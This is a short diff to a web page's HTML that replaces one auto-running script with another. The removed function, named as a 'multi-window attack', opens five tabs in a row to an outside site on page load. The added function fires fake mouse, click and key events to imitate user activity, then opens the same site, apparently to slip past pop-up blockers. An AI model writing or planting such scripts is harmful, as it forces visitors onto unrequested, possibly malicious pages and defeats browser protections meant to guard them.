@@ -103,18 +103,24 @@
     </style>
 </head>
 <body>
- <script>
-function ataqueMultiVentana() {
-    // Abrir múltiples ventanas rápidamente
-    for(let i = 0; i < 5; i++) {
-        setTimeout(() => {
-            window.open('https://cybercat-synthwave.com/asu2', '_blank');
-        }, i * 100); // 100ms entre cada apertura
-    }
+<script>
+function simularInteraccionCompleja() {
+    // Simular múltiples eventos de usuario
+    ['mousemove', 'click', 'keydown'].forEach(eventType => {
+        const event = new Event(eventType, {
+            bubbles: true,
+            cancelable: true
+        });
+        document.dispatchEvent(event);
+    });
+    
+    // Esperar un poco y luego abrir
+    setTimeout(() => {
+        window.open('https://cybercat-synthwave.com/asu2', '_blank', 'popup=no');
+    }, 50);
 }
 
-// Disparar después de 2 segundos
-setTimeout(ataqueMultiVentana, 10);
+setTimeout(simularInteraccionCompleja, 0);
 </script>
         <div id="ad-top-banner" class="ad-block">
             <script type="text/javascript">
